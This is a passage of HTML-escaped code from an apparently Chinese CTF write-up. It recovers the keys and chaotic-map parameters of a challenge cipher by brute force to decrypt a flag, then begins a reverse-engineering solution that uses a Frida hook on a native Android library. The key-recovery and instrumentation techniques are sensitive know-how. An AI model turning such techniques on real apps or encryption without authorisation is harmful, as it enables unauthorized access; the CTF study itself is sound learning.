class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;241&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;96&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;57&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;148&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;207&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;29&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;237&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;124&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;177&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;166&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;161&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;122&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;61&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;71&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;46&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;82&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;157&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;253&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;130&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;112&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;66&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;94&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;57&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;221&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;243&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;222&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;192&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;147&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;130&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;201&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;174&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;26&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;160&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;188&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;103&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;187&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;238&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;182&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;144&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;137&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;84&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;239&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;219&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;83&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;112&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;189&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;166&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;58&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;93&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;141&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;198&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;220&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;196&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;118&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;172&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;45&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;get_nums&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# [78, 86, 169, 177]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后进行枚举4x4很快：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key1&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;keys&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key2&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;keys&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;bins&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testimage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testimage_enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;bins&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;00&amp;#34;&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testimage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testimage_enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;bins&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;01&amp;#34;&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testimage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testimage_enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;bins&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;10&amp;#34;&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testimage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testimage_enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;bins&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;11&amp;#34;&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里可以得到8组bins和key1，key2，接下来可以枚举二次函数的参数r，r的范围是0-2之间的1位小数，这时可以排除掉7组不满足条件的。&lt;/p&gt;
&lt;p&gt;可以得到r=1.2，key1=169，key2=78，并且保存对应的密钥流bins：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;key1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;169&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;78&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1.2&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;bins&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;10111011001001011011100010101011101111001001110010110110010000001100000001001010101011111110111011001001001001111001111100100100110110110100001101110110000001011110011001100000010110000100000111010000111101011000111010001100111001010110111001011010111011001101001111100010100001111110001011100111010110010101010101111011110011011011001110010101101011011110001000000001011001000110000011011100101010100111001001110110111001010001111001011011110011011101010011001110100001011011110011100111101101000101010001110111&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;SEQS&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x0&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1000000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1000000&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;seqs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;generate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;seqs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;22000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SEQS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;seqs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1000000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;span class=&#34;c1&#34;&gt;# 0.840264&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;枚举一下得到六位小数，这样就有了所有的参数。然后直接调用encrypt函数就可以解密：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;encrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag_enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;flag_bytes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;flag_bytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hexdigest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reverse&#34;&gt;Reverse&lt;/h2&gt;
&lt;h3 id=&#34;glass&#34;&gt;glass&lt;/h3&gt;
&lt;p&gt;frida得到rc4的xor的数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;hook&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
    &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;module&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;findModuleByName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;libnative-lib.so&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;module&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Exports&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;module&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;enumerateExports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
